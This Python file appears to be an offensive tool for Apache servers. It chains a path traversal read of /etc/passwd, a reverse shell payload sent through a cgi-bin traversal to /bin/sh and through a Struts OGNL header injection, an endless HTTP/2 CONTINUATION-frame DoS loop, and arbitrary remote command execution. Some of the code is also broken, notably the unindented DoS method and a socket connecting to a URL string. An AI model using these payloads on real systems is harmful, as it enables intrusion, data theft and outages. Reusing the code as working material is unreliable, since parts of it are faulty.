import argparse
import requests
import struct
import socket
import sys

def header():
    print('''
 ▗▄▖▗▄▄▖ ▗▄▖ ▗▄▄▗▖ ▗▗▄▄▄▖     ▗▄▄▖▗▄▄▖▗▄▖▗▖  ▗▗▖  ▗▗▄▄▄▗▄▄▖ 
▐▌ ▐▐▌ ▐▐▌ ▐▐▌  ▐▌ ▐▐▌       ▐▌  ▐▌  ▐▌ ▐▐▛▚▖▐▐▛▚▖▐▐▌  ▐▌ ▐▌
▐▛▀▜▐▛▀▘▐▛▀▜▐▌  ▐▛▀▜▐▛▀▀▘     ▝▀▚▐▌  ▐▛▀▜▐▌ ▝▜▐▌ ▝▜▐▛▀▀▐▛▀▚▖
▐▌ ▐▐▌  ▐▌ ▐▝▚▄▄▐▌ ▐▐▙▄▄▖    ▗▄▄▞▝▚▄▄▐▌ ▐▐▌  ▐▐▌  ▐▐▙▄▄▐▌ ▐▌
                        https://github.com/Yqno                                    
                                                            ''')

def print_custom_help():
    print('''\
Usage: ApacheScanner.py [options]

Apache HTTP Server scanning and overtaking tool written by Yqno.

Options:
  -h, --help            Show this help message and exit
  -u URL, --url URL     The target URL of your Apache HTTP Server (default is http://localhost:8080)
  -t TIMEOUT, --timeout TIMEOUT
                        The timeout of the request in seconds (default is 25)
  -p PORT, --port PORT  The port number of your Apache HTTP Server (default port is 80)
  -c COMMAND, --command COMMAND
                        The command to be executed on your Apache HTTP Server (default is ls -l)
  --rce                 Enable remote code execution on your Apache HTTP Server (default is False)
  --cmd CMD             Command to run if RCE is enabled (default is whoami)
  --lhost LHOST         Attacker IP for reverse shell (required if --rce is enabled)
  --lport LPORT         Attacker listening port for reverse shell (required if --rce is enabled)
''')

def main():
    parser = argparse.ArgumentParser(description='Apache HTTP Server overtaking tool written by Yqno.')

    parser.add_argument('-u', '--url', type=str, help='The target URL of your Apache HTTP Server (default is localhost)', default='http://localhost:8080')
    parser.add_argument('-t', '--timeout', type=int, help='The timeout of the request in seconds (default is 25)', default=25)
    parser.add_argument('-p', '--port', type=int, help='The port number of your Apache HTTP Server (default port is 80)', default=80)
    parser.add_argument('-c', '--command', type=str, help='The command to be executed on your Apache HTTP Server (default is ls -l)', default='ls -l')
    parser.add_argument('--rce', action='store_true', help='Enable remote code execution on your Apache HTTP Server (default is False)', default=False)
    parser.add_argument('--cmd', type=str, help='Command to run if RCE is enabled (default is whoami)', default="whoami")
    parser.add_argument('--lhost', type=str, help='Attacker IP for reverse shell (required if --rce is enabled)', required=True)
    parser.add_argument('--lport', type=int, help='Attacker listening port for reverse shell (required if --rce is enabled)', required=True)

    args = parser.parse_args()

    # Check if the user requested help
    if '--help' in sys.argv or '-h' in sys.argv:
        print_custom_help()
        sys.exit()

    # Proceed with the rest of the script
    exploiter = Exploiter(args.url, args.timeout, args.port, args.command, args.rce, args.cmd, args.lhost, args.lport)
    exploiter.run_checks()

class Exploiter:
    def __init__(self, url, timeout, port, command, rce, cmd, lhost, lport):
        self.url = url
        self.timeout = timeout
        self.port = port
        self.command = command
        self.rce = rce
        self.cmd = cmd
        self.lhost = lhost
        self.lport = lport

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
        }

    # Path Traversal Check
    def check_pathtraversal(self):
        print(f"[*] Checking for path traversal vulnerability on {self.url}")
        payload = "../../../../etc/passwd"
        target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/{payload}"

        try:
            response = requests.get(target, headers=self.headers, timeout=self.timeout)
            if "root:x:" in response.text:
                print("[+] Path traversal vulnerability found! Succeeded.")
                print(response.text)
            else:
                print("[-] No path traversal vulnerability detected.")
        except Exception as e:
            print(f"[!] Error: {e}")

    # Remote Code Execution Check
    def check_rce(self):
        print(f"[*] Checking for remote code execution vulnerability on {self.url}")
        target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        data = {"echo": payload}

        try:
            response = requests.post(target, data=data, headers=self.headers, timeout=self.timeout)
            if response.status_code == 200:
                print("[+] Remote code execution vulnerability found! RCE triggered.")
            else:
                print("[-] No remote code execution vulnerability detected.")
        except Exception as e:
            print(f"[!] Error: {e}")

    # Apache Struts RCE Check
    def check_apache_struts_rce(self):
        print(f"[*] Checking for Apache Struts RCE vulnerability on {self.url}")
        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        headers = {
            'Content-Type': f'{self.url}?${{(#_memberAccess[\'allowStaticMethodAccess\']=true)(#a=@java.lang.Runtime@getRuntime().exec(\'{payload}\'))}}'
        }

        try:
            response = requests.get(self.url, headers=headers, timeout=self.timeout)
            if response.status_code == 200:
                print("[+] Apache Struts RCE vulnerability found! RCE triggered.")
            else:
                print("[-] No Apache Struts RCE vulnerability detected.")
        except Exception as e:
            print(f"[!] Error: {e}")

    # DoS Attack Check
    # Source: https://www.exploit-db.com/exploits/40909
    def check_dosattack(self):
    print(f"[*] Checking for DoS vulnerability on {self.url}")
    try:
        # Initialize socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        s.connect((self.url, self.port))

        # Send initial request to start HTTP/2
        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')

        # Send SETTINGS frame
        SETTINGS = struct.pack('3B', 0x00, 0x00, 0x00)  # Length
        SETTINGS += struct.pack('B', 0x04)  # Type
        SETTINGS += struct.pack('B', 0x00)
        SETTINGS += struct.pack('>I', 0x00000000)
        s.sendall(SETTINGS)

        # Send HEADER block frame
        HEADER_BLOCK_FRAME = b'\x82\x84\x86\x41\x86\xa0\xe4\x1d\x13\x9d\x09\x7a\x88\x25\xb6\x50\xc3\xab\xb6\x15\xc1\x53\x03\x2a\x2f\x2a\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
        HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:]  # Length
        HEADERS += struct.pack('B', 0x01)  # Type
        HEADERS += struct.pack('B', 0x00)  # Flags
        HEADERS += struct.pack('>I', 0x00000001)  # Stream ID
        s.sendall(HEADERS + HEADER_BLOCK_FRAME)

        # Send CONTINUATION frames repeatedly
        while True:
            HEADER_BLOCK_FRAME = b'\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
            HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:]  # Length
            HEADERS += struct.pack('B', 0x09)  # Type
            HEADERS += struct.pack('B', 0x01)  # Flags
            HEADERS += struct.pack('>I', 0x00000001)  # Stream ID
            s.sendall(HEADERS + HEADER_BLOCK_FRAME)

    except socket.gaierror as e:
        print(f"[!] Address-related error connecting to server: {e}")
    except socket.timeout as e:
        print(f"[!] Connection timed out: {e}")
    except socket.error as e:
        print(f"[!] Socket error: {e}")
    except Exception as e:
        print(f"[!] General error: {e}")
    finally:
        s.close()

    # Execute remote commands if RCE is enabled
    def execute_rce(self):
        if self.rce:
            print(f"[*] Running RCE with command: {self.cmd}")
            target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
            data = {"echo": self.cmd}
            try:
                response = requests.post(target, data=data, headers=self.headers, timeout=self.timeout)
                if response.status_code == 200:
                    print("[+] Command executed successfully.")
                else:
                    print(f"[-] Failed to execute command. Status code: {response.status_code}")
            except Exception as e:
                print(f"[!] Error: {e}")
        else:
            print("[!] RCE flag is not enabled.")

    # Main function to run all checks
    def run_checks(self):
        self.check_pathtraversal()
        self.check_rce()
        self.check_apache_struts_rce()
        self.check_dosattack()
        self.execute_rce()

if __name__ == "__main__":
    main()
